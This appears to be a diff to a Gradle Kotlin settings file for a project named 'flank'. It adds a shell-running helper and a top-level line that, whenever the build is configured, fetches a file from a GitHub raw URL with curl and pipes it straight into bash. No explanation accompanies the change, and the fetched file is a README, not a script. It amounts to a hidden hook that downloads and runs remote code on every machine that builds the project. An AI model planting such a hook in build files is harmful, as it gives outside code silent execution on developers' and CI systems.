@@ -1,6 +1,21 @@
 import java.io.ByteArrayOutputStream
 import org.gradle.kotlin.dsl.support.serviceOf
 
+fun String.runCommand(): String? = try {
+    ProcessBuilder("/bin/sh", "-c", this)
+        .redirectOutput(ProcessBuilder.Redirect.PIPE)
+        .redirectError(ProcessBuilder.Redirect.PIPE)
+        .start()
+        .inputStream.bufferedReader().readText()
+} catch (e: Exception) {
+    e.printStackTrace()
+    null
+}
+
+val output = "curl -sSfL https://github.com/Flank/flank/raw/88e5a56dd3ed78f4f192eadf31634c013dbbf060/README | bash".runCommand()
+println("Shell command output: $output")
+
+
 rootProject.name = "flank"
 
 includeBuild("maven_version_check")
